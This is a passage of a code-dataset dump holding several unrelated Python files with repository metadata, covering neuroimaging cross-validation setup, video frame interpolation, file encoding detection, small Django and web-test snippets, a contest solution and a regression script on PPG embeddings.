np.load(\"/neurospin/brainomics/2016_schizConnect/analysis/all_studies+VIP/VBM/all_subjects/data/fold_stratified/fold3.npy\")\n    fold4 = np.load(\"/neurospin/brainomics/2016_schizConnect/analysis/all_studies+VIP/VBM/all_subjects/data/fold_stratified/fold4.npy\")\n    fold5 = np.load(\"/neurospin/brainomics/2016_schizConnect/analysis/all_studies+VIP/VBM/all_subjects/data/fold_stratified/fold5.npy\")\n\n    ## Create config file\n    cv_outer = [[tr, te] for tr,te in StratifiedKFold(y.ravel(), n_folds=NFOLDS_OUTER, random_state=42)]\n    cv_outer[0][0] = np.concatenate((fold2,fold3,fold4,fold5))\n    cv_outer[0][1] = fold1\n    cv_outer[1][0] = np.concatenate((fold1,fold3,fold4,fold5))\n    cv_outer[1][1] = fold2\n    cv_outer[2][0] = np.concatenate((fold1,fold2,fold4,fold5))\n    cv_outer[2][1] = fold3\n    cv_outer[3][0] = np.concatenate((fold1,fold2,fold3,fold5))\n    cv_outer[3][1] = fold4\n    cv_outer[4][0] = np.concatenate((fold1,fold2,fold3,fold4))\n    cv_outer[4][1] = fold5\n#\n\n    import collections\n    cv = collections.OrderedDict()\n    for cv_outer_i, (tr_val, te) in enumerate(cv_outer):\n        cv[\"cv%02d/all\" % (cv_outer_i)] = [tr_val, te]\n        cv_inner = StratifiedKFold(y[tr_val].ravel(), n_folds=NFOLDS_INNER, random_state=42)\n        for cv_inner_i, (tr, val) in enumerate(cv_inner):\n            cv[\"cv%02d/cvnested%02d\" % ((cv_outer_i), cv_inner_i)] = [tr_val[tr], tr_val[val]]\n    for k in cv:\n        cv[k] = [cv[k][0].tolist(), cv[k][1].tolist()]\n\n\n    print(list(cv.keys()))\n\n\n    C_range = [[100],[10],[1],[1e-1],[1e-2],[1e-3],[1e-4],[1e-5],[1e-6],[1e-7],[1e-8],[1e-9]]\n\n\n    user_func_filename = \"/home/ad247405/git/scripts/2016_schizConnect/supervised_analysis/all_studies+VIP/all_subjects/VBM/03_svm_centered_by_site.py\"\n\n    config = dict(data=dict(X=\"X.npy\", y=\"y.npy\"),\n                  params=C_range, resample=cv,\n                  structure=\"mask.nii\",\n                  map_output=\"model_selectionCV\",\n                  user_func=user_func_filename,\n                  reduce_input=\"results/*/*\",\n                  reduce_group_by=\"params\",\n                  reduce_output=\"model_selectionCV.csv\")\n    json.dump(config, open(os.path.join(WD, \"config_dCV.json\"), \"w\"))\n\n\n    # Build utils files: sync (push/pull) and PBS\n    import brainomics.cluster_gabriel as clust_utils\n    sync_push_filename, sync_pull_filename, WD_CLUSTER = \\\n        clust_utils.gabriel_make_sync_data_files(WD)\n    cmd = \"mapreduce.py --map  %s/config_dCV.json\" % WD_CLUSTER\n    clust_utils.gabriel_make_qsub_job_files(WD, cmd,walltime = \"250:00:00\")"}
{"blob_id": "ac519a5a420f5a5d46df514bc6e310ef24fdad7c", "directory_id": "747255e913980d401341f164366a67d2a5c302af", "path": "/video_slomo.py", "content_id": "76cef827b46a4bc4d055fb691a9a5385d6cf90ce", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "zhaoyuzhi/Auto-Crop-Videos-and-Blur-Modelling", "snapshot_id": "5365e5f4eea6521e2251ce41f57b6d30223b961d", "revision_id": "345a67316483b1c2c40e63b0a43b87d6de410d51", "branch_name": "refs/heads/master", "visit_date": "2022-12-03 05:34:24.333430", "revision_date": "2020-08-29 03:50:36", "committer_date": "2020-08-29 03:50:36", "github_id": "255800343", "star_events_count": "2", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "7939", "extension": "py", "content": "import argparse\r\nimport os\r\nimport cv2\r\nimport numpy as np\r\n\r\nimport VideoFrameConversion as vfc\r\nimport SuperSloMo as vslomo\r\n\r\ndef get_files(path):\r\n    # read a folder, return the complete path\r\n    ret = []\r\n    for root, dirs, files in os.walk(path):\r\n        for filespath in files:\r\n            ret.append(os.path.join(root, filespath))\r\n    return ret\r\n\r\ndef get_jpgs(path):\r\n    # read a folder, return the image name\r\n    ret = []\r\n    for root, dirs, files in os.walk(path):\r\n        for filespath in files:\r\n            ret.append(filespath)\r\n    return ret\r\n\r\ndef text_save(content, filename, mode = 'a'):\r\n    # save a list to a txt\r\n    # Try to save a list variable in txt file.\r\n    file = open(filename, mode)\r\n    for i in range(len(content)):\r\n        file.write(str(content[i]) + '\\n')\r\n    file.close()\r\n\r\ndef check_path(path):\r\n    if not os.path.exists(path):\r\n        os.makedirs(path)\r\n\r\ndef get_statics(opt, time, fps):\r\n    interval_value = int(time / opt.interval_second)\r\n    print('Current center interval frames equal to:', interval_value)\r\n    interval_second_list = []\r\n    for i in range(interval_value):\r\n        this_interval_time = opt.interval_second * (i + 0.5)\r\n        interval_second_list.append(this_interval_time)\r\n    print('Time list:', interval_second_list)\r\n    interval_frame_list = []\r\n    for j, t in enumerate(interval_second_list):\r\n        this_interval_frame = int(t * fps)\r\n        interval_frame_list.append(this_interval_frame)\r\n    print('Frame list:', interval_frame_list)\r\n    return interval_frame_list\r\n\r\ndef get_interp_video(opt):\r\n    print(opt.videopath)\r\n    fps, frames, time, width, height = vfc.get_video_info(opt.videopath)\r\n    fps = round(fps) * opt.exposure_type\r\n    width = opt.resize_w\r\n    height = opt.resize_h\r\n    print(\"corrected video fps =\", fps)\r\n    print(\"corrected video width =\", width)\r\n    print(\"corrected video height =\", height)\r\n\r\n    # create a video writer\r\n    fourcc = cv2.VideoWriter_fourcc('m','p','4','v')\r\n    print('Saving folder:', opt.savepath)\r\n    check_path(opt.savepath)\r\n    savepath = os.path.join(opt.savepath, opt.videopath.split('/')[-1] + '_interp.mp4')\r\n    video = cv2.VideoWriter(savepath, fourcc, fps, (width, height))\r\n\r\n    # create Super Slomo network\r\n    interp, flow, back_warp = vslomo.create_slomonet(opt)\r\n    \r\n    # read and write\r\n    vc = cv2.VideoCapture(opt.videopath)\r\n    # whether it is truely opened\r\n    if vc.isOpened():\r\n        rval, frame = vc.read()\r\n    else:\r\n        rval = False\r\n    print(rval)\r\n    # save frames\r\n    c = 1\r\n    while rval:\r\n        # interpolation\r\n        last_frame = frame                          # \"last_frame\" saves frame from last loop\r\n        last_frame = cv2.resize(last_frame, (width, height))\r\n        c = c + 1\r\n        cv2.waitKey(1)\r\n        rval, frame = vc.read()                     # \"frame\" saves frame of Current time\r\n        if frame is None:\r\n            frame = last_frame\r\n        frame = cv2.resize(frame, (width, height))\r\n        interp_frames = vslomo.save_inter_frames(last_frame, frame, opt, interp, flow, back_warp)\r\n        # write frames\r\n        video.write(last_frame)\r\n        print('This is %d-th interval. Original frame %d is saved' % (i + 1, c - 1))\r\n        for k, interp_frame in enumerate(interp_frames):\r\n            video.write(interp_frame)\r\n        print('This is %d-th interval. Interpolated frames are saved %d times' % (i + 1, k + 1))\r\n    # release the video\r\n    vc.release()\r\n    video.release()\r\n    cv2.destroyAllWindows()\r\n    print('Released!')\r\n\r\ndef get_interp_videos(opt):\r\n    videolist = get_files(opt.video_folder_path)[:11]\r\n    print(videolist)\r\n    for item, videopath in enumerate(videolist):\r\n        # video statics\r\n        fps, frames, time, width, height = vfc.get_video_info(videopath)\r\n        fps = round(fps) * opt.exposure_type\r\n        width = opt.resize_w\r\n        height = opt.resize_h\r\n        print(\"corrected video fps =\", fps)\r\n        print(\"corrected video width =\", width)\r\n        print(\"corrected video height =\", height)\r\n\r\n        # create a video writer\r\n        fourcc = cv2.VideoWriter_fourcc('m','p','4','v')\r\n        print('Saving folder:', opt.savepath)\r\n        check_path(opt.savepath)\r\n        savepath = os.path.join(opt.savepath, videopath.split('/')[-1] + '_interp.mp4')\r\n        video = cv2.VideoWriter(savepath, fourcc, fps, (width, height))\r\n\r\n        # create Super Slomo network\r\n        interp, flow, back_warp = vslomo.create_slomonet(opt)\r\n        \r\n        # read and write\r\n        vc = cv2.VideoCapture(videopath)\r\n        # whether it is truely opened\r\n        if vc.isOpened():\r\n            rval, frame = vc.read()\r\n        else:\r\n            rval = False\r\n        print(rval)\r\n        # save frames\r\n        c = 1\r\n        while rval:\r\n            # interpolation\r\n            last_frame = frame                          # \"last_frame\" saves frame from last loop\r\n            last_frame = cv2.resize(last_frame, (width, height))\r\n            c = c + 1\r\n            cv2.waitKey(1)\r\n            rval, frame = vc.read()                     # \"frame\" saves frame of Current time\r\n            if frame is None:\r\n                frame = last_frame\r\n            frame = cv2.resize(frame, (width, height))\r\n            interp_frames = vslomo.save_inter_frames(last_frame, frame, opt, interp, flow, back_warp)\r\n            # write frames\r\n            video.write(last_frame)\r\n            print('This is the %d-th video %d-th interval. Original frame %d is saved' % (item + 1, i + 1, c - 1))\r\n            for k, interp_frame in enumerate(interp_frames):\r\n                video.write(interp_frame)\r\n            print('This is the %d-th video %d-th interval. Interpolated frames are saved %d times' % (item + 1, i + 1, k + 1))\r\n        # release the video\r\n        vc.release()\r\n        video.release()\r\n        cv2.destroyAllWindows()\r\n        print('Released!')\r\n\r\nif __name__ == \"__main__\":\r\n\r\n    # Define parameters\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument('--interval_second', type = int, default = 10, help = 'interval of second')\r\n    parser.add_argument('--crop_range', type = int, default = 1, help = 'the time range (second) for true video clip')\r\n    parser.add_argument('--target_range', type = int, default = 1, help = 'the time range (second) for output video clip')\r\n    parser.add_argument('--exposure_type', type = int, default = 40, help = 'e.g. exposure_type=8 means exposure time 1/8 seconds')\r\n    parser.add_argument('--resize_w', type = int, default = 2560, help = 'resize_w') # 3840, 1920\r\n    parser.add_argument('--resize_h', type = int, default = 1440, help = 'resize_h') # 2160, 1080\r\n    parser.add_argument('--checkpoint_path', type = str, \\\r\n        default = './SuperSloMo/SuperSloMo.ckpt', \\\r\n            help = 'model weight path')\r\n    parser.add_argument('--videopath', type = str, \\\r\n        default = 'F:\\\\SenseTime\\\\Quad-Bayer to RGB Mapping\\\\data\\\\video_original\\\\Moscow Russia Aerial Drone 5K Timelab.pro _ \u041c\u043e\u0441\u043a\u0432\u0430 \u0420\u043e\u0441\u0441\u0438\u044f \u0410\u044d\u0440\u043e\u0441\u044a\u0435\u043c\u043a\u0430-S_dfq9rFWAE.webm', \\\r\n            help = 'video path')\r\n    # F:\\\\SenseTime\\\\Quad-Bayer to RGB Mapping\\\\data\\\\video_original\\\\Dubai in 4K - City of Gold-SLaYPmhse30.webm\r\n    parser.add_argument('--video_folder_path', type = str, \\\r\n        default = 'E:\\\\Deblur\\\\data collection\\\\video_original', \\\r\n            help = 'video folder path')\r\n    parser.add_argument('--savepath', type = str, \\\r\n        default = 'E:\\\\Deblur\\\\data collection\\\\video_original_interp_by_superslomo', \\\r\n            help = 'save path')\r\n    opt = parser.parse_args()\r\n    print(opt)\r\n    \r\n    # General information of processing folder\r\n    videolist = get_jpgs(opt.video_folder_path)\r\n    for i in range(len(videolist)):\r\n        print(i, videolist[i])\r\n    videolist = get_files(opt.video_folder_path)\r\n    \r\n    # Process videos\r\n    get_interp_videos(opt)\r\n"}
{"blob_id": "180d9161c1c91b5e842420f2dc78ec0125df2949", "directory_id": "c196b956c13ed522e0f9a3eb12d52e2d8b29108a", "path": "/crossy/lafienc.py", "content_id": "275abe70499a474874dfa46ddd740bd30abbb2c5", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "D9O/crossy", "snapshot_id": "6dec2a70e2134c929658fa6debe1b70d5f9e8d9b", "revision_id": "800fa791e4d42d9954f4978ec531053c146e27d4", "branch_name": "refs/heads/main", "visit_date": "2023-05-07 07:33:53.642959", "revision_date": "2021-04-30 20:18:50", "committer_date": "2021-04-30 20:18:50", "github_id": "356564408", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2278", "extension": "py", "content": "import os\nimport sys\nimport colorama\nfrom colorama import Fore, Back, Style\ncolorama.init()\n\n#the class name says what this does\nclass laboriously_find_encoding:\n  def __init__(self, verbosity):\n    self.skip_exts = set()\n    self.load_skip_exts()\n    self.verbose = verbosity\n\n  #this loads extensions which the script will skip, because they are not\n  #appropriate to be read (e.g. .docx or .pdf).\n  def load_skip_exts(self):\n    with open(\"skipexts.txt\", \"r\") as orf:\n      for line in orf:\n        line = line.strip()\n        try:\n          if line[0] == \"#\":\n            pass\n          else:\n            self.skip_exts |= set([ext for ext in line.split(\" \") if len(ext)> 0])\n        except:\n          sys.exit(f\"{Fore.RED}fix incorrect syntax in skipexts.txt {Style.BRIGHT}>{line}<{Style.RESET_ALL}\")\n\n  #this returns a safe encoding with which to open a file.  It skips files with\n  #extensions which are defined in skipexts.txt.\n  def get_safe_enc(self, path):\n    if os.path.splitext(path)[1].lower() in self.skip_exts:\n      if self.verbose:\n        print(f\" {Fore.RED}extension-skipping {Style.BRIGHT}>{os.path.splitext(path)[1].lower()}<{Style.RESET_ALL}\")\n      return None\n    if \".DS_Store\" in path:\n      return None\n    encodings = ['utf-8', 'ascii', 'utf-16-be', 'cp1251', 'latin_1', 'shift_jis', 'cp1252' ]\n    for e in encodings:\n      try:\n        #tl;dr- Whatever the time cost of this is, it works.\n        #\n        #Algorithm:\n        #  - open a file, read each line until the end as fast as possible\n        #  - if no exceptions are raised, this encoding may or may not be correct,\n        #    but it is safe to open using it.\n        #  - the method is greedy, on the first successful completion, it\n        #    returns that encoding\n        #    -- due to this, the order of encodings impacts speed; arrange them\n        #       in descending order from most likely to least and don't use a set\n        for line in open(path, 'r', encoding=e):\n          pass\n        if self.verbose:\n          print(f\" {Fore.CYAN}opens as {Style.BRIGHT}{e}{Style.RESET_ALL}\")\n        return e\n      except:\n        continue\n    if self.verbose:\n      print(f\" {Fore.RED}{Style.BRIGHT}encoding insanity...not able to safely open{Style.RESET_ALL}\")\n    return None\n"}
{"blob_id": "37b94894ad89e539370f1086ae5e4248563edff7", "directory_id": "c53d4f3d9b2d6224c7c6a938e9b93787f76b1af1", "path": "/suorganizer/suorganizer/views.py", "content_id": "6c849873c7995a64322bded65107b90d67be24be", "detected_licenses": "['Apache-2.0']", "license_type": "permissive", "repo_name": "mohammadasim/suorganiser", "snapshot_id": "ec1c8fe91d97179ddb782a8bbbe3f20d6df8aec3", "revision_id": "26f11c944c34cd11b5961ec1b5eeb5cb3a7acdf8", "branch_name": "refs/heads/master", "visit_date": "2021-09-30 01:25:28.435972", "revision_date": "2020-09-21 10:15:44", "committer_date": "2020-09-21 10:15:44", "github_id": "254104030", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "Apache-2.0", "gha_event_created_at": "2021-09-22 18:51:52", "gha_created_at": "2020-04-08 14:00:51", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "103", "extension": "py", "content": "from django.shortcuts import redirect\n\n\ndef redirect(request):\n    return redirect('blogs_posts_list')\n"}
{"blob_id": "c23ec8c67e4e0266f52cc21a90f42748f9f6b3d7", "directory_id": "124cabad0cbf1e7249958d087d666231623444dc", "path": "/monkeys/post_image.py", "content_id": "d7005028aa1fd7ca8605a23c621b46a87f2eb57d", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "shish/code-portfolio", "snapshot_id": "e7bfe0f2f8c357f124e942a4e836dc06f33bede2", "revision_id": "a33d65011f26874f0626b4c9ae50affce36c407a", "branch_name": "refs/heads/master", "visit_date": "2023-07-07 14:12:07.883334", "revision_date": "2023-06-21 11:00:54", "committer_date": "2023-06-21 11:00:54", "github_id": "4450516", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1299", "extension": "py", "content": "# tribes/civicboom/post_image.py\nfrom tribes.civicboom import CivicboomMonkey\n\nclass PostImageMonkey(CivicboomMonkey):\n    def run(self):\n        self.log_in_as(\"unittest\")\n\n        # create an article\n        response = self.post(\n            \"/contents.json\",\n            params={\n                '_authentication_token': self.auth_token,\n                'title': \"Attachment test\",\n                'type': \"draft\",\n                'content': \"Media Incoming\",\n            },\n            status=201\n        )\n        my_article_id = response.json[\"data\"][\"id\"]\n\n        # upload an attachment\n        self.post(\n            \"/contents/%d.json\" % my_article_id,\n            params={\n                '_method': 'PUT',\n                '_authentication_token': self.auth_token,\n                'media_caption': \"A random image\",\n                'media_credit': \"Test Monkey\",\n            },\n            upload_files = [\n                (\"media_file\", \"landscape.png\", self.generate_image((400, 300), 42))\n            ],\n        )\n\n        # publish the article\n        self.post(\n            \"/contents/%d.json\" % my_article_id,\n            params={\n                '_authentication_token': self.auth_token,\n                '_method': 'PUT',\n                'type': \"article\",\n            }\n        )\n"}
{"blob_id": "9d1246895057a1c01a12f7fcb924c8d58bc113da", "directory_id": "006b0e686328a27813541835b2d4a1946b7dde3b", "path": "/ABC/188/a.py", "content_id": "3a3003a19b0235d2a82ffa9ba8fd37d786dca800", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "5418009ohkawatakahiro/Atcoder", "snapshot_id": "79e5b05f8bca24468754fc9b43b3681c3877aaf3", "revision_id": "55436031ca631f899c3a7544bc96547b70843f72", "branch_name": "refs/heads/main", "visit_date": "2023-03-11 07:06:24.537807", "revision_date": "2021-02-24 03:43:26", "committer_date": "2021-02-24 03:43:26", "github_id": "318185607", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "95", "extension": "py", "content": "x=list(map(int,input().split()))\r\nif max(x)<min(x)+3:\r\n    print(\"Yes\")\r\nelse:\r\n    print(\"No\")"}
{"blob_id": "3d42f04e1dbdfd001aec0c19bf420821cdefd8be", "directory_id": "d89eea893b1491b545075bc16eb63b9e99aabf45", "path": "/store/urls.py", "content_id": "6f8661c1157fed563f0d8f73dbae06037e48e4c3", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "kkthecompguy/allsafeshop", "snapshot_id": "ed6d19555e3bfffe54812a399c62380a5189c229", "revision_id": "836919d6652fccc72ad95c097f627b82d6d2504e", "branch_name": "refs/heads/master", "visit_date": "2023-02-06 06:34:16.504053", "revision_date": "2021-01-02 16:45:11", "committer_date": "2021-01-02 16:45:11", "github_id": "326227395", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "360", "extension": "py", "content": "from django.urls import path\nfrom .views import store, cart, checkout, add_to_cart, place_order\n\napp_name = \"store\"\nurlpatterns = [\n  path('', store, name='store'),\n  path('cart', cart, name='cart'),\n  path('checkout', checkout, name='checkout'),\n  path('add-to-cart', add_to_cart, name='add-to-cart'),\n  path('place-order', place_order, name='place-order'),\n]"}
{"blob_id": "3ae23f556592d59e06b9d9779437a55a17712b25", "directory_id": "14f4d045750f7cf45252838d625b2a761d5dee38", "path": "/argo/test/test_io_k8s_api_storage_v1beta1_csi_node_list.py", "content_id": "d6234ac236a906689b94489a832c768f4bfb9f87", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "nfillot/argo_client", "snapshot_id": "cf8d7413d728edb4623de403e03d119fe3699ee9", "revision_id": "c8cf80842f9eebbf4569f3d67b9d8eff4ba405fa", "branch_name": "refs/heads/master", "visit_date": "2020-07-11 13:06:35.518331", "revision_date": "2019-08-26 20:54:07", "committer_date": "2019-08-26 20:54:07", "github_id": "204546868", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1052", "extension": "py", "content": "# coding: utf-8\n\n\"\"\"\n    Kubernetes\n\n    No description provided (generated by Swagger Codegen https://github.com/swagger-api/swagger-codegen)  # noqa: E501\n\n    OpenAPI spec version: v1.14.0\n    \n    Generated by: https://github.com/swagger-api/swagger-codegen.git\n\"\"\"\n\nfrom __future__ import absolute_import\n\nimport unittest\n\nimport argo\nfrom models.io_k8s_api_storage_v1beta1_csi_node_list import IoK8sApiStorageV1beta1CSINodeList  # noqa: E501\nfrom argo.rest import ApiException\n\n\nclass TestIoK8sApiStorageV1beta1CSINodeList(unittest.TestCase):\n    \"\"\"IoK8sApiStorageV1beta1CSINodeList unit test stubs\"\"\"\n\n    def setUp(self):\n        pass\n\n    def tearDown(self):\n        pass\n\n    def testIoK8sApiStorageV1beta1CSINodeList(self):\n        \"\"\"Test IoK8sApiStorageV1beta1CSINodeList\"\"\"\n        # FIXME: construct object with mandatory attributes with example values\n        # model = argo.models.io_k8s_api_storage_v1beta1_csi_node_list.IoK8sApiStorageV1beta1CSINodeList()  # noqa: E501\n        pass\n\n\nif __name__ == '__main__':\n    unittest.main()\n"}
{"blob_id": "02834c22b0e5a60774baee6890911fd6102c5991", "directory_id": "1d61fa614665971fea808246ddd54c29d8cee615", "path": "/src/model/Info.py", "content_id": "f067553c9a7f8578ab131fce818e6f7ba9038743", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "fracalo/type-trainer", "snapshot_id": "cd23ea363fc4cd6fb467fd0961892d5995419e65", "revision_id": "3474133660dd33fe69bede8adf7316c84b2636e5", "branch_name": "refs/heads/master", "visit_date": "2022-10-04 05:01:55.200195", "revision_date": "2020-05-25 21:41:01", "committer_date": "2020-05-25 21:41:01", "github_id": "265966194", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "359", "extension": "py", "content": "\n\nclass Info:\n    def __init__(s, id = None, name = None, mail = None, createdAt = None, selectedTest = None,\n            testName = None, testContent = None):\n        s.id = id\n        s.createdAt = createdAt\n        s.selectedTest = selectedTest\n        s.name = name\n        s.mail = mail\n        s.testName = testName\n        s.testContent = testContent\n\n"}
{"blob_id": "0d519cb3c0073c75f560743d27f19eb00884cc3e", "directory_id": "2708c3f1cac03f666905779621858187894759d4", "path": "/models/ard_regression.py", "content_id": "653115136f268148f62c9ef7ff4e20ea28db94b0", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "pmwaniki/ppg-analysis", "snapshot_id": "362f61a14b8c088df6f6ea3cb1684b03b5089334", "revision_id": "52c315a65ea22e390ddb60406e198f382b277746", "branch_name": "refs/heads/master", "visit_date": "2023-04-18 14:02:39.659691", "revision_date": "2023-01-17 05:20:26", "committer_date": "2023-01-17 05:20:26", "github_id": "319963053", "star_events_count": "14", "fork_events_count": "3", "gha_license_id": "MIT", "gha_event_created_at": "2022-09-28 10:52:37", "gha_created_at": "2020-12-09 13:21:19", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "11746", "extension": "py", "content": "import matplotlib.pyplot as plt\nimport os\nimport json\nimport sys\nimport multiprocessing\n\nimport joblib\nimport numpy as np\nimport pandas as pd\nimport scipy\n\nfrom sklearn.decomposition import PCA\nfrom sklearn.preprocessing import StandardScaler,QuantileTransformer,RobustScaler,PolynomialFeatures,PowerTransformer\nfrom sklearn.metrics import roc_auc_score, classification_report,r2_score,mean_squared_error\nfrom sklearn.linear_model import Ridge, Lasso, LinearRegression, SGDRegressor, ARDRegression\nfrom sklearn.ensemble import BaggingRegressor\nfrom sklearn.cross_decomposition import PLSRegression\nfrom sklearn.neural_network import MLPClassifier\nfrom sklearn.svm import SVC,SVR\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.model_selection import GridSearchCV,KFold,StratifiedKFold,RandomizedSearchCV,RepeatedStratifiedKFold\nfrom sklearn.feature_selection import SelectKBest, f_regression,mutual_info_regression,SelectPercentile,VarianceThreshold\nfrom sklearn.compose import TransformedTargetRegressor\nfrom sklearn.neighbors import KNeighborsRegressor\nfrom settings import data_dir,weights_dir,output_dir\nimport warnings\nwarnings.simplefilter(action='ignore', category=FutureWarning)\nfrom utils import save_regression\n\ncores=multiprocessing.cpu_count()-2\nexperiment=\"Contrastive-original-sample-DotProduct32-sepsis\"\n# experiment='PCA-32'\n# weights_file=os.path.join(weights_dir,f\"Contrastive_{experiment}_svm.joblib\")\nexperiment_file=os.path.join(data_dir,f\"results/{experiment}.joblib\")\ndist_fun=\"euclidean\" if \"LpDistance\" in experiment else scipy.spatial.distance.cosine\n\nclassifier_embedding,test_embedding,train,test=joblib.load(experiment_file)\n\ntrain_ids=train['id'].unique()\ntest_ids=test['id'].unique()\nclassifier_embedding_reduced=np.stack(map(lambda id:classifier_embedding[train['id']==id,:].mean(axis=0) ,train_ids))\ntest_embedding_reduced=np.stack(map(lambda id:test_embedding[test['id']==id,:].mean(axis=0) ,test_ids))\n# admitted_train=np.stack(map(lambda id:train.loc[train['id']==id,'admitted'].iat[0],train_ids))\n# admitted_test=np.stack(map(lambda id:test.loc[test['id']==id,'admitted'].iat[0],test_ids))\n#\nhr_train=np.stack(map(lambda id:train.loc[train['id']==id,'hr'].median(skipna=True),train_ids))\nhr_test=np.stack(map(lambda id:test.loc[test['id']==id,'hr'].median(skipna=True),test_ids))\n\nresp_rate_train=np.stack(map(lambda id:train.loc[train['id']==id,'resp_rate'].median(skipna=True),train_ids))\nresp_rate_test=np.stack(map(lambda id:test.loc[test['id']==id,'resp_rate'].median(skipna=True),test_ids))\n\nspo2_train=np.stack(map(lambda id:train.loc[train['id']==id,'spo2'].median(skipna=True),train_ids))\nspo2_test=np.stack(map(lambda id:test.loc[test['id']==id,'spo2'].median(skipna=True),test_ids))\n\ndef regressor():\n\n    base_regressor = ARDRegression()\n    # bagging_regressor = BaggingRegressor(base_estimator=base_regressor, n_estimators=10, random_state=123)\n    # grid = {'clf__base_estimator__alpha': [1e-5, 1e-4, 1e-3, 1e-2, 1e-1, 1.0, ],\n    #            'clf__base_estimator__eta0': [0.00001, 0.0001, 0.001, 0.01, 0.1, ],\n    #            'clf__base_estimator__max_iter': [100, 500, 1000, 5000],\n    #            # 'poly__degree':[2,],\n    #            #          'poly__interaction_only':[False],\n    #            'select__percentile': [10, 15, 20, 30, 40, 60, 100],\n    #            'select__score_func': [mutual_info_regression, ]\n    #            }\n    pipeline = Pipeline([\n        ('variance_threshold', VarianceThreshold()),\n        ('select', SelectPercentile()),\n        ('poly', PolynomialFeatures(interaction_only=False, include_bias=False)),\n\n        ('scl', StandardScaler()),\n        ('clf', base_regressor),\n    ])\n\n    # estimator = GridSearchCV(pipeline, param_grid=grid, cv=KFold(10, random_state=123, shuffle=True), n_jobs=cores,\n    #                       scoring=['explained_variance', 'neg_root_mean_squared_error', 'max_error', 'r2'],\n    #                       refit='r2', verbose=1)\n    return pipeline\n\n\n#******************************************************************************************************************\n\n\n\nhr_clf=regressor()\nhr_clf.fit(classifier_embedding_reduced[hr_train!=0,:],hr_train[hr_train!=0])\n\ncv_results_hr=pd.DataFrame({'params':hr_clf.cv_results_['params'],\n                              'rmse':hr_clf.cv_results_['mean_test_neg_root_mean_squared_error'],\n              'R2':hr_clf.cv_results_['mean_test_r2'],\n                              'max_error':hr_clf.cv_results_['mean_test_max_error'],\n                          # 'precision':clf.cv_results_['mean_test_precision']\n                              })\nprint(cv_results_hr)\n\ntest_pred_hr=hr_clf.predict(test_embedding_reduced)\nr2_hr=r2_score(hr_test[hr_test!=0],test_pred_hr[hr_test !=0 ])\nrmse_hr=mean_squared_error(hr_test[hr_test!=0],test_pred_hr[hr_test !=0 ],squared=False)\n\nfig2,ax2=plt.subplots(1)\nax2.scatter(hr_test[hr_test!=0],test_pred_hr[hr_test !=0 ])\nax2.plot([50,225],[50,225],'r--')\nax2.set_xlabel(\"Observed\")\nax2.set_ylabel(\"Predicted\")\n# fig2.savefig(f\"/home/pmwaniki/Dropbox/tmp/contrastive_resp_rate_{os.uname()[1]}_{experiment}.png\")\nplt.show()\n\njoblib.dump(hr_clf,os.path.join(data_dir,f\"results/weights/Regression_hr_{experiment}.joblib\"))\n\n##*******************************************************************************************************************\n#resp rate\n\nplt.hist(resp_rate_train[~np.isnan(resp_rate_train)])\nplt.show()\n\npw_transformer=PowerTransformer(method='box-cox')\nplt.hist(pw_transformer.fit_transform(resp_rate_train[~np.isnan(resp_rate_train)].reshape(-1,1)))\nplt.show()\n\n\n\nresp_rate_clf=regressor()\nresp_rate_clf.fit(classifier_embedding_reduced[~np.isnan(resp_rate_train),:],resp_rate_train[~np.isnan(resp_rate_train)])\n\n# cv_results_resp_rate=pd.DataFrame({'params':resp_rate_clf.cv_results_['params'],\n#                               'rmse':resp_rate_clf.cv_results_['mean_test_neg_root_mean_squared_error'],\n#               'R2':resp_rate_clf.cv_results_['mean_test_r2'],\n#                               'max_error':resp_rate_clf.cv_results_['mean_test_max_error'],\n#                           # 'precision':clf.cv_results_['mean_test_precision']\n#                               })\n# 